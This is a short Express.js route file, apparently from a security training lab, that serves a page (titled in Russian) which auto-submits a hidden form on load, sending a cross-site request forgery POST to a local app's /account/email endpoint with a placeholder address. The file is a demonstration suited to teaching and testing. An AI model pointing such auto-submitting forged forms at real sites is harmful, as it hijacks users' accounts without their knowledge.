'use strict';

const router = require('express').Router();
const page = require('../views/page');
const target = require('../target');

router.get('/csrf',(req,res)=>res.send(page('CSRF: автоматическая отправка',`<p>После открытия страницы отправляется POST в локальное приложение.</p><form id="f" action="http://localhost:${target(req)}/account/email" method="POST"><input type="hidden" name="email" value="changed-by-csrf@example.test"></form><script>document.getElementById('f').submit()</script>`)));

module.exports = router;
